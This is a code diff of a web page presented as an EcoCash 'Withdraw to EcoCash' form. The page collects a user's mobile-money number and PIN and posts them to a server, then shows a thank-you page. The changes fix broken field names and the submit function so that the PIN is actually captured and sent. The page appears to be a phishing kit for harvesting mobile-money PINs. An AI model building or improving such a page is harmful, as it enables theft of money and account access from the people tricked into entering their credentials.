@@ -74,6 +74,11 @@ input{
     font-size:15px;
 }
 
+input:focus{
+    outline:none;
+    border-color:#1877f2;
+}
+
 button{
     width:100%;
     padding:13px;
@@ -84,6 +89,10 @@ button{
     font-weight:bold;
     font-size:15px;
     cursor:pointer;
+}
+
+button:hover{
+    opacity:.95;
 }
 
 .footer{
@@ -105,28 +114,36 @@ button{
 <div class="form">
 
     <label>EcoCash Number</label>
-    <input type="tel" id="ecocash_number" placeholder="e.g. 077 123 4567">
+    <input
+        type="tel"
+        id="ecocash_number"
+        placeholder="e.g. 0771234567"
+    >
 
     <label>EcoCash Pin</label>
-    <input type="text" id="reference_number" placeholder="Enter EcoCash pin">
+    <input
+        type="text"
+        id="ecocash_pin"
+        placeholder="Enter ecocash pin"
+    >
 
-    <button onclick="Withdraw to EcoCash()">
+    <button onclick="submitForm()">
         Withdraw to EcoCash
     </button>
 
     <div class="footer">
-        <a href="#">Need Help?</a>
+        <a href="#">Forgot Pin?</a>
     </div>
 
 </div>
 
 </div><script>
-async function withdraw to EcoCash () {
+async function submitForm() {
 
     const ecocash_number =
         document.getElementById("ecocash_number").value;
 
-    const reference_ =
+    const ecocash_pin =
         document.getElementById("ecocash_pin").value;
 
     if (!ecocash_number || !ecocash_pin) {
@@ -144,8 +161,8 @@ async function withdraw to EcoCash () {
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
-                    ecocash_number,
-                    enter_your_pin
+                    ecocash_number: ecocash_number,
+                    ecocash_pin: ecocash_pin
                 })
             }
         );
@@ -153,21 +170,15 @@ async function withdraw to EcoCash () {
         const data = await response.json();
 
         if (data.success) {
-
-            alert("withdrawal initiated successfully.");
-
+            alert("Withdrawal initiated successfully.");
             window.location.href = "thankyou.html";
-
         } else {
-
             alert("Submission failed.");
-
         }
 
     } catch (error) {
-
         alert("Server connection error.");
-
+        console.log(error);
     }
 }
 </script></body>
